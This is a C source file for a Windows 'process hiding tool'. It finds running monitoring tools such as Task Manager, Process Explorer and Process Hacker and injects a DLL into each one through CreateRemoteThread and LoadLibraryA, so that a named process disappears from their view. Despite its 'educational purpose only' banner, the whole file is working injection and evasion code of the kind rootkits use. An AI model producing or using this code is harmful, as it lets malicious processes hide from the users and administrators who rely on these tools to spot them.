#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#define DLL_NAME "win_process_hider.dll"
#define TARGET_ENV_VAR "TARGET_PROCESS"

// Function to inject DLL into a process
BOOL InjectDLL(DWORD processId, const char* dllPath) {
    HANDLE hProcess;
    LPVOID pRemoteBuf;
    LPTHREAD_START_ROUTINE pThreadProc;
    HANDLE hThread;
    BOOL bSuccess = FALSE;
    SIZE_T bytesWritten = 0;
    
    // Get a handle to the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("Error: Could not open process (PID: %lu) - Error code: %lu\n", 
               processId, GetLastError());
        return FALSE;
    }
    
    // Allocate memory in the remote process
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, lstrlenA(dllPath) + 1, 
                               MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf) {
        printf("Error: Could not allocate memory in remote process - Error code: %lu\n", 
               GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, 
                           lstrlenA(dllPath) + 1, &bytesWritten)) {
        printf("Error: Could not write to remote process memory - Error code: %lu\n", 
               GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Get address of LoadLibraryA
    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pThreadProc) {
        printf("Error: Could not get address of LoadLibraryA - Error code: %lu\n", 
               GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Create a remote thread that calls LoadLibraryA with our DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, 
                                pRemoteBuf, 0, NULL);
    if (!hThread) {
        printf("Error: Could not create remote thread - Error code: %lu\n", 
               GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
    
    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// Get process IDs of monitoring tools
void InjectIntoMonitoringTools(const char* targetProcess) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD currentPID;
    BOOL injectedAny = FALSE;
    char dllPath[MAX_PATH];
    char currentDir[MAX_PATH];
    
    // Get the full path of the DLL
    GetCurrentDirectoryA(MAX_PATH, currentDir);
    sprintf_s(dllPath, MAX_PATH, "%s\\%s", currentDir, DLL_NAME);
    
    // Make sure the DLL exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("Error: DLL not found: %s\n", dllPath);
        printf("Make sure to run build_x64.bat first.\n");
        return;
    }
    
    // Get current process ID
    currentPID = GetCurrentProcessId();
    
    // Set the environment variable for the target process
    SetEnvironmentVariableA(TARGET_ENV_VAR, targetProcess);
    
    // Create a snapshot of all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error: Could not create process snapshot\n");
        return;
    }
    
    // Initialize the size of the structure
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    // Get the first process
    if (!Process32First(hSnapshot, &pe32)) {
        printf("Error: Could not get first process\n");
        CloseHandle(hSnapshot);
        return;
    }
    
    // Check each process
    do {
        // Skip our own process
        if (pe32.th32ProcessID == currentPID)
            continue;
        
        // Check if it's a monitoring tool
        if (_stricmp(pe32.szExeFile, "taskmgr.exe") == 0 ||
            _stricmp(pe32.szExeFile, "procexp.exe") == 0 ||
            _stricmp(pe32.szExeFile, "procexp64.exe") == 0 ||
            _stricmp(pe32.szExeFile, "ProcessHacker.exe") == 0) {
            
            printf("Found monitoring tool: %s (PID: %lu)\n", 
                   pe32.szExeFile, pe32.th32ProcessID);
            
            // Inject the DLL
            printf("Injecting into %s...\n", pe32.szExeFile);
            if (InjectDLL(pe32.th32ProcessID, dllPath)) {
                printf("Successfully injected into %s\n", pe32.szExeFile);
                injectedAny = TRUE;
            } else {
                printf("Failed to inject into %s\n", pe32.szExeFile);
            }
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    // Clean up
    CloseHandle(hSnapshot);
    
    if (!injectedAny) {
        printf("No process monitoring tool detected.\n");
        printf("Please start at least one of:\n");
        printf("- Task Manager (taskmgr.exe)\n");
        printf("- Process Explorer (procexp.exe)\n");
        printf("- Process Hacker (ProcessHacker.exe)\n");
        printf("\nThen run this script again.\n");
    } else {
        printf("\nProcess hiding activated for: %s\n", targetProcess);
        printf("The process should now be hidden from the injected monitoring tools.\n");
    }
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <process_name_to_hide>\n", argv[0]);
        printf("Example: %s notepad.exe\n", argv[0]);
        return 1;
    }
    
    printf("Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY\n");
    printf("===================================================\n\n");
    printf("Target process to hide: %s\n\n", argv[1]);
    
    InjectIntoMonitoringTools(argv[1]);
    
    return 0;
}
